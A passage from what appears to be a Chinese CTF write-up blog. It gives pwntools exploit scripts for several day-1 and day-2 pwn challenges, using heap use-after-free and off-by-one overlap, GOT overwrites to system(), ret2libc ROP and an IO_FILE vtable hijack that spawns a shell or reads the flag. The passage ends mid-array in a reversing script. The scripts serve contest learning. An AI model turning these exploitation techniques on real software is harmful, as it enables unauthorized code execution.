&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length &gt; '</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">'Value &gt;'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'CNote &gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index &gt; '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'CNote &gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index &gt; '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">32</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">32</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">'sh\x00\x00'</span>+p32(elf.symbols[<span class="string">'system'</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="Pwn4"><a href="#Pwn4" class="headerlink" title="Pwn4:"></a>Pwn4:</h5><p>off byu one修改chunk_size,然后Extend overlapping 控制造成double free ,然后重新分配内存控制指针。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./wood'</span>)</span><br><span class="line"></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">p= process(<span class="string">'./wood'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'172.1.8.10'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"0"</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> +<span class="string">"a"</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ions : "</span>)</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libcbase = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base:'</span>+hex(libcbase)</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="Pwn5"><a href="#Pwn5" class="headerlink" title="Pwn5:"></a>Pwn5:</h5><p>这一题是我队长做的<br>这一道题也是简单的栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal=["tmux","splitw","-h"]</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a==<span class="number">1</span>:</span><br><span class="line">p = remote(<span class="string">'172.1.8.8'</span>,<span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi=<span class="number">0x000400713</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'tell me your name'</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'What do you want to say to me?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.symbols[<span class="string">"main"</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libcbase=puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br><span class="line"></span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libcbase</span><br><span class="line">binsh_addr=<span class="number">0x0018cd57</span>+libcbase</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'tell me your name'</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'What do you want to say to me?'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">40</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="day2"><a href="#day2" class="headerlink" title="day2:"></a>day2:</h3><h5 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1:"></a>pwn1:</h5><p>这一题是我队长做的<br>CTFwiki IO_file的原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd=<span class="string">"cat /flag.txt&gt;&amp;0"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">"172.1.8.3"</span>,<span class="number">8888</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sys_off=<span class="number">0xf02b0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"it "</span>)</span><br><span class="line">stdout_addr=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stdout_addr="</span>+hex(stdout_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>])</span><br><span class="line"></span><br><span class="line">libc.address=stdout_addr-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">sys_addr=libc.address+sys_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_address="</span>+hex(libc.address)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system addr="</span>+hex(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xd8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[_IO_2_1_stdout_]+0xd8"</span>+hex(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xd8</span>) <span class="comment">#vtable地址</span></span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">64</span>+<span class="number">8</span>)[<span class="number">0</span>])</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xd9</span>))</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">64</span>+<span class="number">8</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xa0</span>))</span><br><span class="line">p.send(p64(sys_addr)[<span class="number">0</span>])</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xa1</span>))</span><br><span class="line">p.send(p64(sys_addr)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">p.send(p64(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xa2</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]+<span class="number">0xa2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.send(p64(sys_addr)[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(cmd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2:"></a>pwn2:</h5><p>这道题没做出来，卡住了半截，因为比赛时间有限，没做出来，这里就贴我解题思路的一半的脚本，等我写出来了再更新。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('172.1.8.4',8888)</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(length,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice-&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input string Length: \n'</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">'Author name:\n'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice-&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New Author name:\n'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(<span class="string">'New contents:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice-&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice-&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'666'</span>)</span><br><span class="line">r=p.recvline()</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=puts()</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">puts_addr=int(r[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr=libc_base+<span class="number">0x45216</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"exit"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'free_hook:'</span>+hex(free_hook)</span><br><span class="line">binsh=u64(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,p64(binsh)+<span class="string">'\x20'</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">index=p.recv(<span class="number">6</span>)</span><br><span class="line">chunk_addr=u64(index.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(chunk_addr)</span><br><span class="line">edit(p64(free_hook),p64(system_addr))</span><br><span class="line">edit(p64(system_addr),p64(system_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3:"></a>pwn3:</h5><p>这一题是我队友做的。<br>这题是一道逆向题，当输入的值满足条件，就直接进shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">ar2 = [<span class="number">0x1</span> , <span class="number">0x10</span> , <span class="number">0x25</span> , <span class="number">0x3</span> , <span class="number">0xd</span> , <span class="number">0xa</span> , <span class="number">0x2</span> , <span class="number">0xb</span> , <span class="number">0x28</span> , <span class="number">0x2</span> , <span class="number">0x14</span> , <span class="number">0x3f</span> , <span class="number">0x1</span> , <span class="number">0x17</span> , <span class="number">0x3c</span> , <span class="number">0x1</span> , <span class="number">0x0</span> , <span class="number">0x69</span> , <span class="number">0x1</span> , <span class="number">0x12</span> , <span class="number">0x3f</span> , <span class="number">0x2</span> , <span class="number">0xe</span> , <span class="number">0x77</span> , <span class="number">0x3</span> , <span class="number">0x15</span> , <span class="number">0x53</span> , <span class="number">0x2</span> , <span class="number">0xe</span> , <span class="number">0x7d</span> , <span class="number">0x3</span> , <span class="number">0x5</span> , <span class="number">0xa</span> , <span class="number">0x2</span> , <span class="number">0x4</span> , <span class="number">0x55</span> , <span class="number">0x2</span> , <span class="number">0x15</span> , <span class="number">0x33</span> , <span class="number">0x2</span> , <span class="number">0x15</span> , <span class="number">0x5</span> , <span class="number">0x1</span> , <span class="number">0x5</span> , <span class="number">0x2f</span> , <span class="number">0x3</span> , <span class="number">0x7</span> , <span class="number">0x43</span> , <span class="number">0x1</span> , <span class="number">0x11</span> , <span class="number">0x39</span> , <span class="number">0x3</span> , <span class="number">0xd</span> , <span class="number">0x27</span> , <span class="number">0x1</span> , <span class="number">0x5</span> , <span class="number">0x1e</span> , <span class="number">0x3</span> , <span class="number">0x4</span> , <span class="number">0x3c</span> , <span class="number">0x1</span> , <span class="number">0x13</span> , <span class="number">0x1e</span> , <span class="number">0x3</span> , <span class="number">0x1</span> , <span class="number">0x78</span> , <span class="number">0x1</span> , <span class="number">0x0</span> , <span class="number">0x20</span> , <span class="number">0x2</span> , <span class="number">0xf</span> , <span class="number">0x53</span> , <span class="number">0x3</span> , <span class="number">0x14</span> , <span class="number">0x2b</span> , <span class="number">0x3</span> , <span class="number">0x14</span> , <span class="number">0x28</span> , <span class="number">0x3</span> , <span class="number">0xa</span> , <span class="number">0x19</span> , <span class="number">0x3</span> , <span class="number">0x12</span> , <span class="number">0x60</span> , <span class="number">0x1</span> , <span class="number">0x5</span> , <span class="number">0x7e</span> , <span class="number">0x3</span> , <span class="number">0xf</span> , <span class="number">0x20</span> , <span class="number">0x1</span> , <span class="number">0xf</span> , <span class="number">0x58</span> , <span class="number">0x2</span> , <span class="number">0x11</span> , <span class="number">0x51</span> , <span class="number">0x1</span> , <span class="number">0xb</span> , <span class="number">0x24</span> , <span class="number">0x1</span> , <span class="number">0x17</span> , <span class="number">0x79</span> , <span class="number">0x1</span> , <span class="number">0xe</span> , <span class="number">0x4a</span> , <span class="number">0x3</span> , <span class="number">0x10</span> , <span class="number">0x67</span> , <span class="number">0x2</span> , <span class="number">0x16</span> , <span class="number">0x5c</span> , <span class="number">0x3</span> , <span class="number">0x9</span> , <span class="number">0x6d</span> , <span class="number">0x1</span> , <span class="number">0x17</span> , <span class="number">0x30</span> , <span class="number">0x2</span> , <span class="number">0xa</span> , <span class="number">0x2c</span> , <span class="number">0x3</span> , <span class="number">0x7</span> , <span class="number">0x3f</span> , <span class="number">0x3</span> , <span class="number">0x7</span> , <span class="number">0x43</span> , <span class="number">0x1</span> , <span class="number">0x4</span> , <span class="number">0x4</span> , <span class="number">0x2</span> , <span class="number">0x0</span> , <span class="number">0xf</span> , <span class="number">0x1</span> , <span class="number">0x2</span> , <span class="number">0x63</span> , <span class="number">0x2</span> , <span class="number">0x3</span> , <span class="number">0x70</span> , <span class="number">0x1</span> , <span class="number">0x8</span> , <span class="number">0x7b</span> , <span class="number">0x2</span> , <span class="number">0x6</span> , <span class="number">0x4c</span> , <span class="number">0x2</span> , <span class="number">0xb</span> , <span class="number">0x7a</span> , <span class="number">0x1</span> , <span class="number">0xc</span> , <span class="number">0xd0</span> , <span class="number">0x2</span> , <span class="number">0x11</span> , <span class="number">0x22</span> , <span class="number">0x2</span> , <span class="number">0x13</span> , <span class="number">0x66</span> , <span class="number">0x4</span> , <span class="number">0x15</span> , <span class="number">0xbb</span> , <span class="number">0x4</span> , <span class="number">0x12</span> , <span class="number">0x80</span> , <span class="number">0x4</span> , <span class="number">0x10</span> , <span class="number">0x67</span> , <span class="number">0x4</span> , <span class="number">0x1</span> , <span class="number">0xd8</span> , <span class="number">0x1</span> , <span class="number">0x3</span> , <span class="number">0x80</span> , <span class="number">0x1</span> , <span class="number">0x4</span> , <span class="number">0x2</span> , <span class="number">0x4</span> , <span class="number">0x4</span> , <span class="number">0x12</span> , <span class="number">0x4</span> , <span class="number">0x5</span> , <span class="number">0x7</span> , <span class="number">0x1</span> , <span class="number">0x6</span> , <span class="number">0xda</span> , <span class="number">0x4</span> , <span class="number">0x7</span> , <span class="number">0x43</span> , <span class="number">0x4</span> , <span class="number">0x7</span> , <span class="number">0x43</span> , <span class="number">0x4</span> , <span class="number">0x7</span> , <span class="number">0x5a</span> , <span class="number">0x2</span> , <span class="number">0x8</span> , <span class="number">0x42</span> , <span class="number">0x4</span> , <span class="number">0x9</span> , <span class="number">0x5f</span> , <span class="number">0x4</span> , <span class="number">0xa</span> , <span class="number">0x59</span> , <span class="number">0x1</span> , <span class="number">0xb</span> , <span class="number">0x79</span> , <span class="number">0x2</span> , <span class="number">0xc</span> , <span class="number">0x6c</span> , <span class="number">0x4</span> , <span class="number">0xd</span> , <span class="number">0xc3</span> , <span class="number">0x1</span> , <span class="number">0xe</span> , <span class="number">0xaf</span> , <span class="number">0x4</span> , <span class="number">0xf</span> , <span class="number">0xa</span> , <span class="number">0x4</span> , <span class="number">0x10</span> , <span class="number">0x67</span> , <span class="number">0x4</span> , <span class="number">0x12</span> , <span class="number">0xc0</span> , <span class="number">0x4</span> , <span class="number">0x14</span> , <span class="number">0x2b</span> , <span class="number">0x4</span> , <span class="number">0x14</span> , <span class="number">0x8</span> , <span class="number">0x1</span> , <span class="number">0x16</span> , <span class="number">0x6c</span> , <span class="number">0x2</span> , <span class="number">0x17</span> , <span class="number">0xd3</span>]</span><br><span class="line"></span><br><span class="line">ar1 = [<span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x60</span> , <span class="number">0x43</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x70</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x44</span> , <span class="number">0x43</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xee</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xfe</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x33</span> , <span class="number">0x43</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x80</span> , <span class="number">0x3f</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x9a</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x2d</span> , <span class="number">0x43</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xda</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xe8</span> , <span class="number">0x41</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xde</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x43</span> , <span class="number">0x43</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x42</span> , <span class="number">0x43</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xc8</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xd8</span> , <span class="number">0x42</span> , <span class="number">0xc2</span> , <span class="number">0x7e</span> , <span class="number">0xab</span> , <span class="number">0x3f</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x70</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x24</span> , <span class="number">0x3f</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , 